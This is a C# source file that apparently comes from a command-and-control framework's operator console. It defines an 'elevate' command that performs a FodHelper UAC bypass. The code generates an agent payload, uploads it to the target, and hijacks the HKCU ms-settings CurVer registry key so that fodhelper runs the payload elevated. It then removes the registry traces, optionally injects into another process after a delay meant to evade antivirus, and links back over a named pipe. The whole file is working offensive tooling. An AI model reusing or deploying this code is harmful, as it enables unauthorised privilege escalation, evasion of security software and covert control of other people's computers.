using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Commands.Agent;
using Commander.Commands.Scripted;
using Commander.Executor;
using Common;
using Common.Payload;
using Shared;
using Spectre.Console;

namespace Commander.Commands.Composite
{
    public class ElevateCommandOptions
    {
        public string key { get; set; }
        public bool verbose { get; set; }

        public string pipe { get; set; }
        public string file { get; set; }
        public string path { get; set; }

        public bool inject { get; set; }

        public int injectDelay { get; set; }

        public string injectProcess { get; set; }

        public bool x86 { get; set; }


    }
    public class ElevateCommand : ScriptCommand<ElevateCommandOptions>
    {
        public override string Description => "UAC Bypass using FodHelper";
        public override string Name => "elevate";
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
             new Option<string>(new[] { "--key", "-k" }, () => "c2s", "Name of the key to use"),
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
             new Option<string>(new[] { "--pipe", "-n" }, () => "elev8","Name of the pipe used to pivot."),
             new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
             new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows\\tasks","Name of the folder to upload the payload."),
             new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
             new Option<int>(new[] { "--injectDelay", "-id" },() => 30, "Delay before injection (AV evasion)"),
             new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
        };

        protected override void Run(ScriptingAgent<ElevateCommandOptions> agent, ScriptingCommander<ElevateCommandOptions> commander, ScriptingTeamServer<ElevateCommandOptions> teamServer, ElevateCommandOptions options, CommanderConfig config)
        {
            var endpoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
            var payloadOptions = new PayloadGenerationOptions()
            {
                Architecture =  options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = options.verbose,
                ServerKey = config.ServerConfig.Key,
                Type = PayloadType.Executable,
                InjectionDelay =  options.injectDelay,
                IsInjected = options.inject,
                InjectionProcess = options.injectProcess
            };

            if (!string.IsNullOrEmpty(options.injectProcess))
                payloadOptions.InjectionProcess = options.injectProcess;

            commander.WriteInfo($"[>] Generating Payload!");
            var pay = commander.GeneratePayload(payloadOptions, options.verbose);
            if (pay == null)
            {
                commander.WriteError($"[X] Generation Failed!");
                return;
            }
            else
                commander.WriteSuccess($"[+] Generation succeed!");


            commander.WriteLine($"Preparing to upload the file...");



            var fileName = string.IsNullOrEmpty(options.file) ? ShortGuid.NewGuid() + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;

            agent.Echo($"Uploading file {fileName} to {path}");
            agent.Upload(pay, path);
            agent.Delay(1);
            agent.Echo($"Altering registry Keys");
            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
            agent.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\command", string.Empty, path);
            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
            agent.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\CurVer", string.Empty, $".{options.key}");
            agent.Delay(5);
            agent.Echo($"Starting fodhelper");
            agent.Shell("fodhelper");
            agent.Delay(5);
            agent.Echo($"Cleaning");
            //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{options.key} -Recurse  -Force -Verbose");
            //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
            agent.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
            agent.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
            if (!options.inject)
            {
                agent.Echo($"[!] Don't forget to remove executable after use! : del {path}");
            }
            else
            {
                agent.Echo($"Waiting {options.injectDelay}s to evade antivirus");
                agent.Delay(options.injectDelay + 10);
                agent.Echo($"Removing injector {path}");
                agent.DeleteFile(path);
            }
            agent.Echo($"Linking to {endpoint}");
            var targetEndPoint = ConnexionUrl.FromString($"rpipe://127.0.0.1:{options.pipe}");
            agent.Link(targetEndPoint);
            agent.Delay(2);
            agent.Echo($"[*] Execution done!");
            agent.Echo(Environment.NewLine);
        }
    }
}
